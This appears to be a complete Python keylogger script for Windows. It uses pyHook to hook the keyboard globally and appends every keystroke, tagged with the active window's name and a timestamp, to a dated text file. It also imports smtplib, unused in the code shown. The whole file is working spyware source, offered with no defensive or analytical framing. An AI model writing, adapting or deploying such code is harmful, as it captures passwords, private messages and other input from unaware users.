import pyHook, pythoncom, smtplib
from datetime import datetime
from time import time

todays_date = datetime.now().strftime('%Y-%b-%d')
file_name =  'test #' + todays_date + '.txt'

line_buffer = ""
window_name = ""

def SaveLineToFile(line):
    todays_file = open(file_name, 'a')
    todays_file.write(line)
    todays_file.close()

def OnKeyboardEvent(event):
    global line_buffer
    global window_name

    """if typing in new window"""
    if window_name != event.WindowName:
        if line_buffer != "":
            line_buffer += '\n'
            SaveLineToFile(line_buffer)

        current_time = datetime.now().time().strftime('%H:%M')
        line_buffer = ""
        SaveLineToFile('\n'+ current_time + '-----WindowName: ' + event.WindowName + '\n')
        window_name = event.WindowName

    """if return or tab key pressed"""
    if(event.Ascii == 13 or event.Ascii == 9):
        line_buffer += '\n'
        SaveLineToFile(line_buffer)
        line_buffer = ""
        return True

    """if backspace key pressed"""
    if event.Ascii == 8:
        line_buffer = line_buffer[:-1]
        return True

    """if non-normal ascii character"""
    if(event.Ascii < 32 or event.Ascii > 126):
        if event.Ascii == 0:
            pass
        else:
            line_buffer = line_buffer + '\n' + str(event.Ascii) + '\n'
    else:
        line_buffer += chr(event.Ascii)

    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages() #red line says it doesn't exist but it does

